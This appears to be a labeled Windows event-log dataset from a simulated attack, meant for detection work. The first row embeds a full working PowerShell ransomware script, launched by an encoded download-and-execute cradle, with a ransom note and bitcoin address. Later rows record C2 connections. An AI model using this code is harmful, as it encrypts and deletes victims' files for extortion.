2022-08-05 22:48:47+00:00,ACC-07,evtx_microsoft-windows-powershell/operational,Execution,Launch ransomware (powershell Get-Y3J5cHRy),0.0,microsoft-windows-powershell/operational;Microsoft-Windows-PowerShell;4103,,,,,,,,,,,,,,,,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-PowerShell"" Guid=""{A0C1853B-5C40-4B15-8766-3CF1C58F985A}""/>     <EventID>4103</EventID>     <Version>1</Version>     <Level>4</Level>     <Task>106</Task>     <Opcode>20</Opcode>     <Keywords>0x0000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:48:47.158003800Z""/>     <EventRecordID>825</EventRecordID>     <Correlation ActivityID=""{02D13C40-F800-0000-ECD2-8735FBA8D801}""/>     <Execution ProcessID=""5148"" ThreadID=""4280""/>     <Channel>microsoft-windows-powershell/operational</Channel>     <Computer>ACC-07.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""ContextInfo"">        Severity = Informational         Host Name = ConsoleHost         Host Version = 5.1.14409.1005         Host ID = 3047957e-4ca3-4c39-a462-8207e05a1e37         Host Application = powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA1ADkAOAA4ADYALwAnACkAOwAgAEcAZQB0AC0AWQAzAEoANQBjAEgAUgB5AA==         Engine Version = 5.1.14409.1005         Runspace ID = 0cb7a1bb-3c97-4a8b-8eb0-ca46fcd9f5e6         Pipeline ID = 1         Command Name = Invoke-Expression         Command Type = Cmdlet         Script Name =          Command Path =          Sequence Number = 24         User = NT AUTHORITY\SYSTEM         Connected User =          Shell ID = Microsoft.PowerShell </Data>     <Data Name=""UserData""/>     <Data Name=""Payload"">CommandInvocation(Invoke-Expression): ""Invoke-Expression"" ParameterBinding(Invoke-Expression): name=""Command""; value=""function New-CryptographyKey() { &lt;# .SYNOPSIS  Generates a random cryptography key.  .DESCRIPTION Generates a random cryptography key based on the desired key size.  .PARAMETER Algorithm Algorithm to generate key for.  .PARAMETER KeySize Number of bits the generated key will have.  .PARAMETER AsPlainText Returns a String instead of SecureString.  .OUTPUTS System.Security.SecureString. New-CryptographyKey return the key as a SecureString by default. System.String. New-CryptographyKey will return the key in plain text as a string if the -AsPlainText parameter is specified.  .EXAMPLE $key = New-CryptographyKey This example generates a random 256-bit AES key and stores it in the variable $key.  .NOTES Author: Tyler Siegrist Date: 9/22/2017 #&gt; [CmdletBinding()] [OutputType([System.Security.SecureString])] [OutputType([String], ParameterSetName='PlainText')] Param(     [Parameter(Mandatory=$false, Position=1)]     [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]     [String]$Algorithm='AES',     [Parameter(Mandatory=$false, Position=2)]     [Int]$KeySize,     [Parameter(ParameterSetName='PlainText')]     [Switch]$AsPlainText )     Process     {         try         {             $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)             if($PSBoundParameters.ContainsKey('KeySize')){                 $Crypto.KeySize = $KeySize             }             $Crypto.GenerateKey()             if($AsPlainText)             {                 return [System.Convert]::ToBase64String($Crypto.Key)             }             else             {                 return [System.Convert]::ToBase64String($Crypto.Key) | ConvertTo-SecureString -AsPlainText -Force             }         }         catch         {             Write-Error $_         }              } }  Function Protect-File { &lt;# .SYNOPSIS  Encrypts a file using a symmetrical algorithm.  .DESCRIPTION Encrypts a file using a symmetrical algorithm.  .PARAMETER FileName File(s) to be encrypted.  .PARAMETER Key Cryptography key as a SecureString to be used for encryption.  .PARAMETER KeyAsPlainText Cryptography key as a String to be used for encryption.  .PARAMETER CipherMode Specifies the block cipher mode to use for encryption.  .PARAMETER PaddingMode Specifies the type of padding to apply when the message data block is shorter than the full number of bytes needed for a cryptographic operation.  .PARAMETER Suffix Suffix of the encrypted file to be removed.  .PARAMETER RemoveSource Removes the source (decrypted) file after encrypting.  .OUTPUTS System.IO.FileInfo. Protect-File will return FileInfo with the SourceFile, Algorithm, Key, CipherMode, and PaddingMode as added NoteProperties  .EXAMPLE Protect-File 'C:\secrets.txt' $key This example encrypts C:\secrets.txt using the key stored in the variable $key. The encrypted file would have the default extension of '.AES' and the source (decrypted) file would not be removed.  .EXAMPLE Protect-File 'C:\secrets.txt' -Algorithm DES -Suffix '.Encrypted' -RemoveSource This example encrypts C:\secrets.txt with a randomly generated DES key. The encrypted file would have an extension of '.Encrypted' and the source (decrypted) file would be removed.  .EXAMPLE Get-ChildItem 'C:\Files' -Recurse | Protect-File -Algorithm AES -Key $key -RemoveSource This example encrypts all of the files under the C:\Files directory using the key stored in the variable $key. The encrypted files would have the default extension of '.AES' and the source (decrypted) files would be removed.  .NOTES Author: Tyler Siegrist Date: 9/22/2017 #&gt; [CmdletBinding(DefaultParameterSetName='SecureString')] [OutputType([System.IO.FileInfo[]])] Param(     [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]     [Alias('PSPath','LiteralPath')]     [string[]]$FileName,     [Parameter(Mandatory=$false, Position=2)]     [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]     [String]$Algorithm = 'AES',     [Parameter(Mandatory=$false, Position=3, ParameterSetName='SecureString')]     [System.Security.SecureString]$Key = (New-CryptographyKey -Algorithm $Algorithm),     [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]     [String]$KeyAsPlainText,     [Parameter(Mandatory=$false, Position=4)]     [System.Security.Cryptography.CipherMode]$CipherMode,     [Parameter(Mandatory=$false, Position=5)]     [System.Security.Cryptography.PaddingMode]$PaddingMode,     [Parameter(Mandatory=$false, Position=6)]     [String]$Suffix = "".$Algorithm"",     [Parameter()]     [Switch]$RemoveSource )     Begin     {         #Configure cryptography         try         {             if($PSCmdlet.ParameterSetName -eq 'PlainText')             {                 $Key = $KeyAsPlainText | ConvertTo-SecureString -AsPlainText -Force             }              #Decrypt cryptography Key from SecureString             $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)             $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))              $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)             if($PSBoundParameters.ContainsKey('CipherMode')){                 $Crypto.Mode = $CipherMode             }             if($PSBoundParameters.ContainsKey('PaddingMode')){                 $Crypto.Padding = $PaddingMode             }             $Crypto.KeySize = $EncryptionKey.Length*8             $Crypto.Key = $EncryptionKey         }         Catch         {             Write-Error $_ -ErrorAction Stop         }     }     Process     {         $Files = Get-Item -LiteralPath $FileName              ForEach($File in $Files)         {             $DestinationFile = $File.FullName + $Suffix              Try             {                 $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)                 $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)                  #Write IV (initialization-vector) length &amp; IV to encrypted file                 $Crypto.GenerateIV()                 $FileStreamWriter.Write([System.BitConverter]::GetBytes($Crypto.IV.Length), 0, 4)                 $FileStreamWriter.Write($Crypto.IV, 0, $Crypto.IV.Length)                  #Perform encryption                 $Transform = $Crypto.CreateEncryptor()                 $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)                 $FileStreamReader.CopyTo($CryptoStream)                      #Close open files                 $CryptoStream.FlushFinalBlock()                 $CryptoStream.Close()                 $FileStreamReader.Close()                 $FileStreamWriter.Close()                  #Delete unencrypted file                 if($RemoveSource){Remove-Item -LiteralPath $File.FullName}                  #Output ecrypted file                 $result = Get-Item $DestinationFile                 $result | Add-Member –MemberType NoteProperty –Name SourceFile –Value $File.FullName                 $result | Add-Member –MemberType NoteProperty –Name Algorithm –Value $Algorithm                 $result | Add-Member –MemberType NoteProperty –Name Key –Value $Key                 $result | Add-Member –MemberType NoteProperty –Name CipherMode –Value $Crypto.Mode                 $result | Add-Member –MemberType NoteProperty –Name PaddingMode –Value $Crypto.Padding                 $result             }             Catch             {                 Write-Error $_                 If($FileStreamWriter)                 {                     #Remove failed file                     $FileStreamWriter.Close()                     Remove-Item -LiteralPath $DestinationFile -Force                 }                 Continue             }             Finally             {                 if($CryptoStream){$CryptoStream.Close()}                 if($FileStreamReader){$FileStreamReader.Close()}                 if($FileStreamWriter){$FileStreamWriter.Close()}             }         }     } }  Function Unprotect-File { &lt;# .SYNOPSIS  Decrypts a file encrypted with Protect-File.  .DESCRIPTION Decrypts a file using a provided cryptography key.  .PARAMETER FileName File(s) to be decrypted.  .PARAMETER Key Cryptography key as a SecureString be used for decryption.  .PARAMETER KeyAsPlainText Cryptography key as a String to be used for decryption.  .PARAMETER CipherMode Specifies the block cipher mode that was used for encryption.  .PARAMETER PaddingMode Specifies the type of padding that was applied when the message data block was shorter than the full number of bytes needed for a cryptographic operation.  .PARAMETER Suffix Suffix of the encrypted file to be removed.  .PARAMETER RemoveSource Removes the source (encrypted) file after decrypting.  .OUTPUTS System.IO.FileInfo. Unprotect-File will return FileInfo with the SourceFile as an added NoteProperty  .EXAMPLE Unprotect-File 'C:\secrets.txt.AES' $key This example decrypts C:\secrets.txt.AES using the key stored in the variable $key. The decrypted file would remove the default extension of '.AES' and the source (encrypted) file would not be removed.  .EXAMPLE Unprotect-File 'C:\secrets.txt.Encrypted' -Algorithm DES -Key $key -Suffix '.Encrypted' -RemoveSource This example decrypts C:\secrets.txt.Encrypted using DES and the key stored in the variable $key. The decrypted file would remove the extension of '.Encrypted' and the source (encrypted) file would be removed.  .EXAMPLE Get-ChildItem 'C:\Files' -Recurse | Unprotect-File -Algorithm AES -Key $key -RemoveSource This example decrypts all of the files under the C:\Files directory using the key stored in the variable $key. The decrypted files would remove the default extension of '.AES' and the source (encrypted) files would be removed.  .NOTES Author: Tyler Siegrist Date: 9/22/2017 #&gt; [CmdletBinding(DefaultParameterSetName='SecureString')] [OutputType([System.IO.FileInfo[]])] Param(     [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]     [Alias('PSPath','LiteralPath')]     [string[]]$FileName,     [Parameter(Mandatory=$false, Position=2, ValueFromPipelineByPropertyName=$true)]     [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]     [String]$Algorithm = 'AES',     [Parameter(Mandatory=$true, Position=3, ValueFromPipelineByPropertyName=$true, ParameterSetName='SecureString')]     [System.Security.SecureString]$Key,     [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]     [String]$KeyAsPlainText,     [Parameter(Mandatory=$false, Position=4, ValueFromPipelineByPropertyName=$true)]     [System.Security.Cryptography.CipherMode]$CipherMode = 'CBC',     [Parameter(Mandatory=$false, Position=5, ValueFromPipelineByPropertyName=$true)]     [System.Security.Cryptography.PaddingMode]$PaddingMode = 'PKCS7',     [Parameter(Mandatory=$false, Position=6)]     [String]$Suffix, #Assigning default value in code due to it not processing "".$Algorithm"" properly when Algorithm is ValueFromPipelineByPropertyName     [Parameter()]     [Switch]$RemoveSource )     Process     {         #Configure cryptography         try         {             if($PSCmdlet.ParameterSetName -eq 'PlainText')             {                 $Key = $KeyAsPlainText | ConvertTo-SecureString -AsPlainText -Force             }              #Decrypt cryptography Key from SecureString             $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)             $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))              $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)             $Crypto.Mode = $CipherMode             $Crypto.Padding = $PaddingMode             $Crypto.KeySize = $EncryptionKey.Length*8             $Crypto.Key = $EncryptionKey         }         Catch         {             Write-Error $_ -ErrorAction Stop         }          if(-not $PSBoundParameters.ContainsKey('Suffix'))         {             $Suffix = "".$Algorithm""         }          #Used to store successfully decrypted file names.         $Files = Get-Item -LiteralPath $FileName          ForEach($File in $Files)         {             #Verify file ends with supplied suffix             If(-not $File.Name.EndsWith($Suffix))             {                 Write-Error ""$($File.FullName) does not have an extension of '$Suffix'.""                 Continue             }              $DestinationFile = $File.FullName -replace ""$Suffix$""              Try             {                 $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)                 $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)                  #Get IV from file                 [Byte[]]$LenIV = New-Object Byte[] 4                 $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null                 $FileStreamReader.Read($LenIV,  0, 3) | Out-Null                 [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)                 [Byte[]]$IV = New-Object Byte[] $LIV                 $FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null                 $FileStreamReader.Read($IV, 0, $LIV) | Out-Null                 $Crypto.IV = $IV                  #Peform Decryption                 $Transform = $Crypto.CreateDecryptor()                 $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)                 $FileStreamReader.CopyTo($CryptoStream)                  #Close open files                 $CryptoStream.FlushFinalBlock()                 $CryptoStream.Close()                 $FileStreamReader.Close()                 $FileStreamWriter.Close()                  #Delete encrypted file                 if($RemoveSource){Remove-Item $File.FullName}                  #Output decrypted file                 Get-Item $DestinationFile | Add-Member –MemberType NoteProperty –Name SourceFile –Value $File.FullName -PassThru             }             Catch             {                 Write-Error $_                 If($FileStreamWriter)                 {                     #Remove failed file                     $FileStreamWriter.Close()                     Remove-Item -LiteralPath $DestinationFile -Force                 }                 Continue             }             Finally             {                 if($CryptoStream){$CryptoStream.Close()}                 if($FileStreamReader){$FileStreamReader.Close()}                 if($FileStreamWriter){$FileStreamWriter.Close()}             }         }     } }   function Get-Y3J5cHRy {     $key = New-CryptographyKey -Algorithm AES     Get-ChildItem ""C:\Users\*\Documents\*"" | Protect-File -Algorithm AES -Key $key -Suffix '.HERMES' -RemoveSource     Get-ChildItem ""C:\Users\*"" | ForEach-Object {Set-Content -Path ""$_\Desktop\DECRYPT_INFORMATION.txt"" -Value 'FOR HELP TO DO DECRYPT PLZ SEND 5 BITCOINS TO 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94  THEN SEND EMAIL TO wangchung01@gmail.com'} }"" </Data>   </EventData> </Event> "
2022-08-05 22:48:48+00:00,ACC-07,evtx_Microsoft-Windows-Sysmon/Operational,Resource Development,Network connection to download ransomware,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,5148,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,tcp,true,ACC-07.corp.net,127.0.0.1,60310,ACC-07.corp.net,127.0.0.1,59886,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:48:48.478169000Z""/>     <EventRecordID>182137</EventRecordID>     <Correlation/>     <Execution ProcessID=""1444"" ThreadID=""1936""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-07.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:48:39.657</Data>     <Data Name=""ProcessGuid"">{7A60D74F-9E4E-62ED-0000-00103738E801}</Data>     <Data Name=""ProcessId"">5148</Data>     <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>     <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">127.0.0.1</Data>     <Data Name=""SourceHostname"">ACC-07.corp.net</Data>     <Data Name=""SourcePort"">60310</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">127.0.0.1</Data>     <Data Name=""DestinationHostname"">ACC-07.corp.net</Data>     <Data Name=""DestinationPort"">59886</Data>     <Data Name=""DestinationPortName""/>   </EventData> </Event> "
2022-08-05 22:48:48+00:00,ACC-07,evtx_Microsoft-Windows-Sysmon/Operational,Resource Development,Network connection to download ransomware,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,3208,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,false,ACC-07.corp.net,127.0.0.1,59886,ACC-07.corp.net,127.0.0.1,60310,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:48:48.478169000Z""/>     <EventRecordID>182138</EventRecordID>     <Correlation/>     <Execution ProcessID=""1444"" ThreadID=""1936""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-07.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:48:39.657</Data>     <Data Name=""ProcessGuid"">{7A60D74F-981A-62ED-0000-00105758B001}</Data>     <Data Name=""ProcessId"">3208</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">false</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">127.0.0.1</Data>     <Data Name=""SourceHostname"">ACC-07.corp.net</Data>     <Data Name=""SourcePort"">59886</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">127.0.0.1</Data>     <Data Name=""DestinationHostname"">ACC-07.corp.net</Data>     <Data Name=""DestinationPort"">60310</Data>     <Data Name=""DestinationPortName""/>   </EventData> </Event> "
2022-08-05 22:49:14+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51017,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:49:14.171069200Z""/>     <EventRecordID>148889</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:49:08.572</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51017</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:49:14+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51018,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:49:14.171069200Z""/>     <EventRecordID>148890</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:49:08.640</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51018</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:49:53+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51032,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:49:53.159967700Z""/>     <EventRecordID>148959</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:49:46.756</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51032</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:49:53+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51033,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:49:53.159967700Z""/>     <EventRecordID>148960</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:49:46.793</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51033</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:50:43+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51050,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:50:43.203971600Z""/>     <EventRecordID>149078</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:50:36.827</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51050</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
